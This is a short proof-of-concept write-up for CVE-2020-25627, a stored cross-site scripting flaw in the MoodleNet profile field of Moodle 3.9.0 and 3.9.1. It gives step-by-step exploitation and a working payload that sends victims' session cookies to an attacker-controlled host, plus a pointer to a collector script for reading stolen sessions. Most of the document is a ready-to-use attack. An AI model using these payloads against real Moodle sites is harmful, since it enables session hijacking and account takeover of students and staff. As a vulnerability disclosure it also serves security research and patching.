# CVE-2020-25627
Stored XSS via moodlenetprofile parameter in user profile

My PoC about this CVE

User requirement: Student ( Or the site for registeration)

XSS in moodlenetprofile
```
Step 1: Log in with an authenticated user (Can register or through creating a new user without assigning roles )

Step 2: Quick access to Edit profile

domain/moodle/user/edit.php?id=<your user_id>&returnto=profile

In MoodleNet profile, add the script as:

<script>alert("HK")</script>

And save:

Step 3: Anytime, the other user goes to view your profile, the stored XSS will trigger.

Steal cookie via script:

<script>var i=new Image;i.src="http://192.168.0.238/xss.php?"+document.cookie;</script>

Change your domain and upload xss.php to your host:

https://github.com/HoangKien1020/pentest/tree/master/XSS

Done. You can view log.txt to get Moodle session.
```
![moodlenetprofile parameter](https://user-images.githubusercontent.com/24661746/122549897-3387b600-d05d-11eb-9adf-bfc783ddde63.png)


Affected version: 3.9.0 , 3.9.1

Source

https://moodle.org/mod/forum/discuss.php?d=410839

Impact about XSS (steal cookies,...), see here:

https://github.com/HoangKien1020/pentest/tree/master/XSS

